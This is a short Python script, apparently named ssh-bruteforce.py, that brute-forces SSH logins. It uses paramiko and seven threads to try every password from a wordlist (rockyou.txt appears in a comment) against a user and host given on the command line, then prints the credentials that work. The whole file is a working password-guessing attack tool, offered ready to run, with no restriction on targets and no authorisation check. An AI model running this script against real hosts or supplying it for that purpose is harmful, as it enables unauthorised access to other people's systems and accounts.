import paramiko
import sys
from concurrent.futures import ThreadPoolExecutor
import time

def ssh_attempt(user, host, password, index, total_passwords):
    percentage = (index / total_passwords) * 100
    print(f"Trying ({index} out of {total_passwords}) {percentage:.2f}%")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password)
        print(f"[+] Successful login to {host}  \nuser: {user}  \npassword: {password}")
        exit(0)
    except EOFError:
        print("[-] Connection reset by peer, waiting before retrying...")
        time.sleep(1)
    except paramiko.AuthenticationException:
        print(f"[-] {password} failed")
    except paramiko.SSHException as e:
        print(f"SSH error occurred: {str(e)}")
    finally:
        client.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python ssh-bruteforce.py <user> <host>")
        return

    user = sys.argv[1]
    host = sys.argv[2]
    #password_list = "rockyou.txt"
    password_list = "passwords.txt"

    with open(password_list, "r", encoding='latin-1') as f:
        passwords = f.read().splitlines()

    total_passwords = len(passwords)
    threads = 7

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for index, password in enumerate(passwords, start=1):
                executor.submit(ssh_attempt, user, host, password, index, total_passwords)
    except KeyboardInterrupt:
        print("Interrupted by user, shutting down...")
        exit(0)

if __name__ == "__main__":
    main()
